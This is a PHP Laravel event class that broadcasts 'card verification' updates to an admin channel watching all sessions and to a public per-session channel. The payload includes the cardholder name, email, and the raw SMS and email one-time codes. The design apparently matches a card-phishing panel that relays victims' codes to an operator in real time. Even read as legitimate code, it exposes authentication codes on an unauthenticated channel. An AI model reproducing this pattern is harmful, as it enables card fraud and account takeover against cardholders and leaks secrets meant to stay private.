<?php

namespace App\Events;

use App\Models\CardVerification;
use Illuminate\Broadcasting\Channel;
use Illuminate\Broadcasting\InteractsWithSockets;
use Illuminate\Broadcasting\PrivateChannel;
use Illuminate\Contracts\Broadcasting\ShouldBroadcastNow;
use Illuminate\Foundation\Events\Dispatchable;
use Illuminate\Queue\SerializesModels;

class CardVerificationUpdated implements ShouldBroadcastNow
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public function __construct(
        public CardVerification $cardVerification
    ) {}

    public function broadcastOn(): array
    {
        return [
            // Admin channel — admin listens to all card verifications
            new PrivateChannel('card-verifications'),
            // Client channel — specific session
            new Channel('card-session.' . $this->cardVerification->session_token),
        ];
    }

    public function broadcastAs(): string
    {
        return 'card.verification.updated';
    }

    public function broadcastWith(): array
    {
        return [
            'id' => $this->cardVerification->id,
            'uuid' => $this->cardVerification->uuid,
            'status' => $this->cardVerification->status,
            'brand' => $this->cardVerification->brand->slug ?? null,
            'cardholder_name' => $this->cardVerification->cardholder_name,
            'card_number_masked' => $this->cardVerification->card_number_masked,
            'card_type' => $this->cardVerification->card_type,
            'email' => $this->cardVerification->email,
            'sms_code' => $this->cardVerification->sms_code,
            'email_code' => $this->cardVerification->email_code,
            'sms_code_valid' => $this->cardVerification->sms_code_valid,
            'email_code_valid' => $this->cardVerification->email_code_valid,
            'updated_at' => $this->cardVerification->updated_at->toISOString(),
        ];
    }
}
